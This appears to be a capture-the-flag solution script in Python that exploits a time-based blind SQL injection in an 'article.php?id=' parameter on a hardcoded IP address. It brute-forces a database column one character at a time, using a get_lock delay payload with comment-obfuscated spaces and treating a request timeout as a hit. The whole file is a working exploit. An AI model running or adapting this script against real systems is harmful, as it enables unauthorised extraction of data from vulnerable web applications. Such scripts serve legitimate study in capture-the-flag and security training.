#!/usr/bin/env python3
# coding=utf-8

"""
sleepcms.py

author: Anemone95,x565178035@126.com
date: 2019-10-16 12:32
"""
import requests
import time
import string
import urllib


def sleepcms():
    base_url = "http://114.55.36.69:8007/article.php?id="
    dic = string.ascii_letters+string.digits+string.punctuation
    flag = ""
    cur = 1
    while True:
        for i in dic:
            payload = "1'/**/and/**/(if(substr(content,{pos},1)='{char}',get_lock('nonce',3),0))/**/#"
            url = base_url+urllib.parse.quote(payload.format(pos=cur,char=i))
            try:
                res = requests.get(url,timeout=2)
            except requests.exceptions.ConnectTimeout:
                break
            except requests.exceptions.ReadTimeout:
                flag += str(i)
                cur += 1
                print(flag)
                break

if __name__ == '__main__':
    sleepcms()

